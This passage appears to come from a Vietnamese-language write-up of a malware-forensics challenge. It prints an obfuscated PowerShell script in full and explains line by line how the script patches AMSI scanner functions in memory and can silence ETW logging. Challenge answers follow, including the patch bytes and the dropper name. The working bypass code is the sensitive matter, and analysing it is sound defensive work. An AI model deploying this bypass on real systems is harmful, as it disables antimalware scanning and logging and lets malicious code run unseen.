        $bytesLibrary  = [Byte[]](0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C)
        $libraryName    = [System.Text.Encoding]::ASCII.GetString($bytesLibrary)
        $initFunction  = [System.Text.Encoding]::ASCII.GetString($bytesInitialize)
        $initializeAddress = Get-WindowsAPIFunction $libraryName $initFunction
        $pointerSize = $SystemMemory::SizeOf([Type][IntPtr])
        if ($pointerSize -eq 8) {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$systemContext = 0
        }
        else {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [IntPtr].MakeByRefType()) ([Int])
            $systemContext = 0
        }
        $securitySuffix = 'Virt' + 'ualProtec'
        $securityMethod = '{0}{1}' -f $securitySuffix, 't'
        $kernelLibrary  = "ker{0}.dll" -f "nel32"
        $securityAddress   = Get-WindowsAPIFunction $kernelLibrary $securityMethod
        $securityDelegate = Get-SystemComponent $securityAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MEMORY_PROTECTION_CONSTANT = 0x00000080
        $optimizationData = [byte[]](0xb8,0x0,0x00,0x00,0x00,0xC3)
        $originalProtection   = 0
        $componentIndex      = 0
        if ($initializeComponent.Invoke("Scanner", [ref]$systemContext) -ne 0) {
            if ($systemContext -eq 0) { Throw "[!] No system component found." }
            else { Throw "[!] Error initializing system component." }
        }
        if ($pointerSize -eq 8) {
            $mainData = $SystemMemory::ReadInt64([IntPtr]$systemContext, 16)
            $componentPointer  = $SystemMemory::ReadInt64([IntPtr]$mainData, 64)
        }
        else {
            $mainData = $SystemMemory::ReadInt32($systemContext + 8)
            $componentPointer  = $SystemMemory::ReadInt32($mainData + 36)
        }
        while ($componentPointer -ne 0) {
            if ($pointerSize -eq 8) {
                $functionTable   = $SystemMemory::ReadInt64([IntPtr]$componentPointer)
                $scannerAddress = $SystemMemory::ReadInt64([IntPtr]$functionTable, 24)
            }
            else {
                $functionTable   = $SystemMemory::ReadInt32($componentPointer)
                $scannerAddress = $SystemMemory::ReadInt32($functionTable + 12)
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)) {
                Throw "[!] Error modifying memory settings at $scannerAddress"
            }
            try {
                $SystemMemory::Copy($optimizationData, 0, [IntPtr]$scannerAddress, 6)
            }
            catch {
                Throw "[!] Error applying optimization at $scannerAddress"
            }
            for ($i=0; $i -lt $optimizationData.Length; $i++) {
                $verificationByte = $SystemMemory::ReadByte([IntPtr]::Add($scannerAddress, $i))
                if ($verificationByte -ne $optimizationData[$i]) { Throw "[!] Optimization failed at $scannerAddress" }
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $originalProtection, [ref]$originalProtection)) {
                Throw "[!] Failed to restore memory settings at $scannerAddress"
            }
            $componentIndex++
            if ($pointerSize -eq 8) {
                $componentPointer = $SystemMemory::ReadInt64([IntPtr]$mainData, 64 + ($componentIndex * $pointerSize))
            }
            else {
                $componentPointer = $SystemMemory::ReadInt32($mainData + 36 + ($componentIndex * $pointerSize))
            }
        }
        if ($OptimizePerformance) {
            $bytesService = [Byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65)
            $serviceName  = [System.Text.Encoding]::ASCII.GetString($bytesService)
            $serviceAddress  = Get-WindowsAPIFunction ("nt{0}.dll" -f "dll") $serviceName
            if (-not $securityDelegate.Invoke($serviceAddress, 1, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)) {
                Throw "[!] Error modifying memory settings of $serviceName"
            }
            try {
                if ($pointerSize -eq 8) {
                    $SystemMemory::WriteByte($serviceAddress, 0xC3)
                }
                else {
                    $servicePatch = [byte[]](0xb8,0xff,0x55)
                    $SystemMemory::Copy($servicePatch, 0, [IntPtr]$serviceAddress, 3)
                }
            }
            catch {
                Throw "[!] Error optimizing $serviceName"
            }
            if (-not $securityDelegate.Invoke($serviceAddress, 1, $originalProtection, [ref]$originalProtection)) {
                Throw "[!] Failed to restore memory settings of $serviceName"
            }
            Write-Output "[*] Connected."
        }
        else {
            Write-Output "[*] System maintenance completed."
        }
    }
    catch {
        Throw $_
    }
}

Invoke-SystemMaintenance -OptimizePerformance
```
</details>

Ở đây mình sẽ giải thích phần main logic trọng tâm của nó chính là dùng để bypass qua AMSI - Anti Malware Scan Interface: đây là một features của windows, cho phép các app thực hiện kết hợp các product liên quan đến anti malware vào các hàm api của thư viện `asmi.dll`, và thực hiện tạo delegate bên trong memory để sử dụng native api windows thực thi invoke thẳng bên trong memory mà không cần drop file, và tránh bị phát hiện bởi antivirus. Bây giờ mình phân tích phần script thực hiện logic chính của đoạn script dài này:

```powershell
 try {
        function Get-WindowsAPIFunction {
            param ([string]$DllName, [string]$FunctionName)
            $moduleHandler = $Core_ModuleLoader.Invoke($null, @($DllName))
            $tempReference = New-Object IntPtr
            $handleReference = New-Object System.Runtime.InteropServices.HandleRef($tempReference, $moduleHandler)
            $Core_FunctionLoader.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleReference, $FunctionName))
        }
```

Đầu tiên script này sẽ gọi 1 hàm thực hiện lấy Windows API function của các file .dll, và file handles được decode bên dưới, để tránh bị detect bởi antivirus.

```powershell
function Get-SystemComponent {
            param (
                [Parameter(Position=0, Mandatory=$true)]
                [IntPtr]$ComponentAddress,
                [Parameter(Position=1, Mandatory=$true)]
                [Type[]]$ParameterTypes,
                [Parameter(Position=2)]
                [Type]$ReturnType = [Void]
            )
            $currentDomain = [AppDomain]::("Curren" + "tDomain")
            $assemblyName = New-Object System.Reflection.AssemblyName('SystemAssembly')
            $assemblyBuilder = $currentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $moduleBuilder = $assemblyBuilder.DefineDynamicModule('SystemModule', $false)
            $typeBuilder = $moduleBuilder.DefineType('SystemComponent', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $constructor = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParameterTypes)
            $constructor.SetImplementationFlags('Runtime, Managed')
            $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParameterTypes)
            $methodBuilder.SetImplementationFlags('Runtime, Managed')
            $componentType = $typeBuilder.CreateType()
            [System.Runtime.InteropServices.Marshal]::("GetDelegate" + "ForFunctionPointer")($ComponentAddress, $componentType)
        }
```
Đây là function quan trọng nhất trong script, nó sử dụng kỹ thuật tạo delegate bên trong memory, cho phép powershell/.NET có thể sử dụng các native API, bây giờ mình sẽ giải thích các phần nền tảng trước như native API, delegate, native code và managed code và tại sao powershell không thể gọi trực tiếp một virtual address bên trong memory:

- Đầu tiên **Native APi** là gì?: là các hàm được export từ DLL bên trong windows, dưới dạng native code như:
> kernel32.dll!VirtualProtect
> amsi.dll!AmsiInitialize
- Nó khác với hàm Powershell hay .NET bình thường, ví dụ trong các ngôn ngữ như C++/C chúng ta có thể sử dụng hàm VirtualProtect(), để có thể gọi về address, size,... chẳng hạn từ bên trong `kernel32.dll`, Nhưng đối với Powershell thì khác, powershell chạy trên **.NET CLR - là môi trường thực thi các ứng dụng trong .NET enviroment**, còn `VirtualProtect` là một hàm native bên trong `kernel32.dll`.

- Tiếp theo là sự khác biệt của **Managed code(Powershell/.NET) và native code (mã máy)**:
  - **Powershell/.NET là managed code** nó có runtime từ CLR quản lý trong môi trường **.NET**, có type system của **.NET**, nhưng nó lại không thể tự gọi một địa chỉ memory được.
  - **Windows API ví dụ như hàm `VirtualProtect` là native code**: nó có thể compiled machine code(mã máy) nằm trong DLL hệ thống, và có thể gọi bằng function pointer một raw address trong memory mà không thuộc CLR.

Nên nó sẽ sinh ra một vấn đề từ con malware này, nếu như nó có thể trả về được memory address, thì làm sao nó có thể bảo powershell gọi được memory này. Dẫn đến attacker sử dụng kỹ thuật **create delegate**.

> Delegate là gì? Trong **.NET**, delegate là một object đại diện cho 1 function/method có signature cụ thể. Trong malware này, delegate không dùng để trỏ đến 1 function C# thông thường, mà nó dùng để trỏ đến 1 native function của `kernel32.dll`, và các DLL khác trong Windows API. Dẫn đến việc attacker có thể làm được điều này:
> Khi nó biết được `VirtualProtect` = 0x771337..., nó có thể dùng định nghĩa của delegate như thế này, để tạo một delegate có signature giống với `VirtualProtect` -> gán địa chỉ đó vào delegate -> Và thực hiện gọi Invoke 

- Toàn bộ hàm `Get-SystemComponent` đang thực hiện build một delegate động, để có thể:
  - Tạo một .NET assembly động trong memory bằng command:
  ```powershell
  $assemblyName = New-Object System.Reflection.AssemblyName('SystemAssembly')
  $assemblyBuilder = $currentDomain.DefineDynamicAssembly($assemblyName,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
  ```
  
  - Tạo một module động trong assembly đó: `$moduleBuilder = $assemblyBuilder.DefineDynamicModule('SystemModule', $false)`
  - Tạo một type mới kế thừa `System.MulticasDelegate`, tạo type thật bằng `CreateType()` và định nghĩa constructor cho delegate.
  - Định nghĩa method `Invoke(), NewSlot, Virtual()` cho delegate
  - Cuối cùng là dùng hàm `Marshal.GetDelegateForFunctionPointer()` để có thể trả về delegate object có thể gọi được, đây là cầu nối chính giúp cho powershell có thể gọi được các function native trong windows API, Nó sẽ thực hiện các hành động sau:
```
[Marshal]::GetDelegateForFunctionPointer($ComponentAddress, $componentType)

-> Nó thực hiện lấy addr function native trong windows API + delegate type có signature chuẩn => Để tạo thành 1 delegate object động có thể thực hiện một method bên trong Powershell

Ví dụ như malware thực hiện một code sau:

$securityDelegate = Get-SystemComponent ` -> tạo một delegate cho function VirtualProtect($securityAddress) và function nhận các tham số bên dưới: 
    $securityAddress `
    @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) `
    ([Bool])

Khi đó trong powershell sẽ có thể gọi được addr memory động:
$securityDelegate.Invoke($scanerAddress, 6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)
```


 - Điểm đặc biệt về cách malware thực hiện create delegate là, bình thường vẫn có thể sử dụng một script C# để define sẵn delegate, nhưng trong trường hợp này, nếu malware làm vậy thì phải compile C#, dễ bị scan từ hệ thống anti virus, nên attacker đã tạo delegate runtime bằng `Reflection.Emit`, đây là cách tạo 1 type .NET ngay trong memory:

```
DefineDynamicAssembly
DefineDynamicModule
DefineType
DefineConstructor
DefineMethod("Invoke")
CreateType
```

Tiếp theo nó thực hiện load vào memory một UnsafeNativeMethod, để thực hiện resolve về module handles name và addr của function, sau đó thực hiện patch memory byte để thực hiện bypass AMSI. Đoạn script sẽ thực hiện hành động chính là:

- Tìm địa chỉ hàm scanner của AMSI trong memory
-> Thực hiện đổi quyền vùng nhớ thành dạng có thể overwrite được như: `PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY,..`
-> Thực hiện ghi đè vài byte đầu của hàm scanner
-> repermissions của vùng memory đó

```powershell
 Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $SystemMemory = [System.Runtime.InteropServices.Marshal]
        $WindowsAPI = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
        $bytesGetFunction = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
        $bytesGetModule  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
        $getFunctionName = [System.Text.Encoding]::ASCII.GetString($bytesGetFunction)
        $getModuleName  = [System.Text.Encoding]::ASCII.GetString($bytesGetModule)
        $Core_ModuleLoader = $WindowsAPI.GetMethod($getModuleName)
        $Core_FunctionLoader = $WindowsAPI.GetMethod($getFunctionName)
        $bytesInitialize = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
        $bytesLibrary  = [Byte[]](0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C)
        $libraryName    = [System.Text.Encoding]::ASCII.GetString($bytesLibrary)
        $initFunction  = [System.Text.Encoding]::ASCII.GetString($bytesInitialize)
        $initializeAddress = Get-WindowsAPIFunction $libraryName $initFunction
        $pointerSize = $SystemMemory::SizeOf([Type][IntPtr])
        if ($pointerSize -eq 8) {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$systemContext = 0
        }
        else {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [IntPtr].MakeByRefType()) ([Int])
            $systemContext = 0
        }
        $securitySuffix = 'Virt' + 'ualProtec'
        $securityMethod = '{0}{1}' -f $securitySuffix, 't'
        $kernelLibrary  = "ker{0}.dll" -f "nel32"
        $securityAddress   = Get-WindowsAPIFunction $kernelLibrary $securityMethod
        $securityDelegate = Get-SystemComponent $securityAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MEMORY_PROTECTION_CONSTANT = 0x00000080
        $optimizationData = [byte[]](0xb8,0x0,0x00,0x00,0x00,0xC3)
        $originalProtection   = 0
        $componentIndex      = 0
        if ($initializeComponent.Invoke("Scanner", [ref]$systemContext) -ne 0) {
            if ($systemContext -eq 0) { Throw "[!] No system component found." }
            else { Throw "[!] Error initializing system component." }
        }
        if ($pointerSize -eq 8) {
            $mainData = $SystemMemory::ReadInt64([IntPtr]$systemContext, 16)
            $componentPointer  = $SystemMemory::ReadInt64([IntPtr]$mainData, 64)
        }
        else {
            $mainData = $SystemMemory::ReadInt32($systemContext + 8)
            $componentPointer  = $SystemMemory::ReadInt32($mainData + 36)
        }
        while ($componentPointer -ne 0) {
            if ($pointerSize -eq 8) {
                $functionTable   = $SystemMemory::ReadInt64([IntPtr]$componentPointer)
                $scannerAddress = $SystemMemory::ReadInt64([IntPtr]$functionTable, 24)
            }
            else {
                $functionTable   = $SystemMemory::ReadInt32($componentPointer)
                $scannerAddress = $SystemMemory::ReadInt32($functionTable + 12)
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)
```

Đầu tiên, script load một `System.Windows.Form` .NET assembly vào process powershell, malware thực hiện load .NET này vì bên trong assembly này có một internal class: `System.Windows.Forms.UnsafeNativeMethods`, class này có wrapper sẵn cho 1 số WinAPI cần thiết cho giai đoạn sau như `GetModuleHandle` và `GetProcAddress`. 

Tiếp theo là thực hiện tạo một biến shortcut trỏ tới .NET class: `System.Runtime.InteropServices.Marshal`. `Marshal` là class của .NET chuyên dùng để làm việc giữa `managed code và native code`. Khi đó malware có thể dùng malware này để có thể gọi các static method trong memory, hoặc thực hiện patch memory.

Cuối cùng là biến `$WindowsAPI` load một assembly đang chứa class Form `Windows.Forms.Form`, tức là trong `System.Windows.Forms.dll`, tìm type/class tên là `System.Windows.Forms.UnsafeNativeMethod`, thì type này mình đã giải thích bên trên, nó sẽ giúp thực hiện trả về module name và process address.

```powershell
 Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $SystemMemory = [System.Runtime.InteropServices.Marshal]
        $WindowsAPI = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
```

```powershell
$bytesGetFunction = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
        $bytesGetModule  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
        $getFunctionName = [System.Text.Encoding]::ASCII.GetString($bytesGetFunction)
        $getModuleName  = [System.Text.Encoding]::ASCII.GetString($bytesGetModule)
        $Core_ModuleLoader = $WindowsAPI.GetMethod($getModuleName)
        $Core_FunctionLoader = $WindowsAPI.GetMethod($getFunctionName)
        $bytesInitialize = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
        $bytesLibrary  = [Byte[]](0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C)
        $libraryName    = [System.Text.Encoding]::ASCII.GetString($bytesLibrary)
        $initFunction  = [System.Text.Encoding]::ASCII.GetString($bytesInitialize)
        $initializeAddress = Get-WindowsAPIFunction $libraryName $initFunction
```

Phần này script thực hiện encode strings bằng các mảng byte để bypass dc scan của AV, phần này nếu decode ascii ra sẽ là:
```
$byteGetFunction = GetProcAddress
$byteGetModule = GetModuleHandle
...
$bytesInitialize = AmsiInitialize
$byteLibrary = amsi.dll

Mục đích ở logic phần sau đoạn code có:

$Core_ModuleLoader = $WindowsAPI.GetMethod($getModuleName)
$Core_FunctionLoader = $WindowsAPI.GetMethod($getFunctionName)
...
$initializeAddress = Get-WindowsAPIFunction $libraryName $initFunction
Chính là dùng để gọi về amsi.dll và handle AmsiInitialize lấy memory addr của handle và library amsi.dll
```

Sau khi có được addr memory của module handle và library rồi, thì nó bắt đầu tạo delegate để gọi tới `AmsiInitialize` bắt đầu kiểm tra và chuẩn bị để patch memory thực hiện bypass AMSI:

```powershell
$pointerSize = $SystemMemory::SizeOf([Type][IntPtr])
if ($pointerSize -eq 8) {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$systemContext = 0
        }
        else {
            $initializeComponent = Get-SystemComponent $initializeAddress @([string], [IntPtr].MakeByRefType()) ([Int])
            $systemContext = 0

```
Nó kiểm tra process bằng script: `$pointerSize = $SystemMemory::SizeOf([Type][IntPtr])`, nếu `pointerSize = 8 -> x64, 4 -> x86`. Phần hàm if-else tạo callable delegate trỏ tới AmsiInitialize với signature tương đương với native code của amsi.dll, sau đó nó gọi tới `initializeComponent.Invoke("Scanner", [ref]$systemContext` -> kết quả là $systemContext chứa pointer tới AMSI context trong memory.

Đây là phần quan trọng nhất, thực hiện patch memory để thực hiện bypass AMSI
```powershell
$securitySuffix = 'Virt' + 'ualProtec'
$securityMethod = '{0}{1}' -f $securitySuffix, 't'
$kernelLibrary  = "ker{0}.dll" -f "nel32"
$securityAddress   = Get-WindowsAPIFunction $kernelLibrary $securityMethod
$securityDelegate = Get-SystemComponent $securityAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$MEMORY_PROTECTION_CONSTANT = 0x00000080
$optimizationData = [byte[]](0xb8,0x0,0x00,0x00,0x00,0xC3)
```
- Đầu tiên nó thực hiện ghép strings method và library của `VirtualProtect() và kernel32.dll`, sau đó nó thực hiện gọi trả về địa chỉ function native API `kernel32.dll!VirtualProtect`, tạo delegate theo logic sau:
```
$securityDelegate.Invoke(
$scannerAddress -> địa chỉ bắt đầu vùng memory đổi quyền - IntPtr
UInt32 -> số byte cần đổi quyền 6 - UInt32
UInt32 -> memory overwrite - $MEMORY_PROTECTION_CONSTANT
UInt32 - &originalProtection
```
Tiếp theo thực hiện tạo biến lưu giá trị patch memory để thực hiện patch vào AMSI scanner, `$optimizationData = B8 00 00 00 00 C3`, khi mình thực hiện Disassemble:

```
mov eax, 0
ret
```
-> Khi hàm bị patch được gọi, nó return 0 ngay lập tức và không chạy logic scan ban đầu nữa, và byte `0x80` là memory protection flag execute write copy. Nó được dùng để tạm thời cho phép ghi vào vùng code.

Cuối cùng là bước bắt đầu patch memory
```
        if ($initializeComponent.Invoke("Scanner", [ref]$systemContext) -ne 0) {
            if ($systemContext -eq 0) { Throw "[!] No system component found." }
            else { Throw "[!] Error initializing system component." }
        }
        if ($pointerSize -eq 8) {
            $mainData = $SystemMemory::ReadInt64([IntPtr]$systemContext, 16)
            $componentPointer  = $SystemMemory::ReadInt64([IntPtr]$mainData, 64)
        }
        else {
            $mainData = $SystemMemory::ReadInt32($systemContext + 8)
            $componentPointer  = $SystemMemory::ReadInt32($mainData + 36)
        }
        while ($componentPointer -ne 0) {
            if ($pointerSize -eq 8) {
                $functionTable   = $SystemMemory::ReadInt64([IntPtr]$componentPointer)
                $scannerAddress = $SystemMemory::ReadInt64([IntPtr]$functionTable, 24)
            }
            else {
                $functionTable   = $SystemMemory::ReadInt32($componentPointer)
                $scannerAddress = $SystemMemory::ReadInt32($functionTable + 12)
            }
            if (-not $securityDelegate.Invoke($scannerAddress, [uint32]6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection)
```

Đầu tiên ở đây là gọi `AmsiInitialize` để lấy AMSI context, nếu call thành công, thì `$systemContext != 0`. Script không patch bừa `AmsiInitialize`. Nó dùng `AmsiInitialize` để lấy context, rồi từ context đó dò vào cấu trúc nội bộ để tìm scanner thật.

Tiếp theo là đọc phần memory structure thủ công với 2 case:

```
- Với x64:
mainData = *(systemContext + 16)
componentPointer = *(mainData + 64)

- Với x86:
mainData = *(systemContext + 8)
componentPointer = *(mainData + 36)
```

Nó đi vào cấu trúc nội bộ của AMSI để lấy pointer tới ds AMSI scanner. Các offset 16,8,64,36 là offset nội bộ dùng kỹ thuật **fragile** hay gặp trong bypass AMSI - [link](https://whitehat.vn/threads/cach-minh-tung-patch-amsi-va-thao-tac-windows-api-de-bypass-antivirus.19393/)

Sau đó thực hiện 1 vòng lặp để lặp qua các componentPointer cần patch, và nếu scanner nào chưa patch thì nó sẽ patch tùy thuộc theo phiên bản, của process.

Và cuối cùng thực hiện patch memory của AMSI `securityDelegate.Invoke($scannerAddress, [uint32]6, $MEMORY_PROTECTION_CONSTANT, [ref]$originalProtection`.

### Task3: During the initial stage of execution, The malicious file performed in-memory patching of a critical security function by overwriting it with a 6-byte sequence that forces the function to return zero. What is this hexadecimal byte sequence?

-> 0xB8,0x0,0x00,0x00,0x00,0xC3

### Task 4: What is the name of the file responsible for dropping the second-stage PE Files? (2nd Stage)

-> Phần marker `::` -> dropper stage 2, là file `dwm.bat`

### Task 5: What is the SHA-1 hash of the PE file created during the infection process, not malicious on its own?

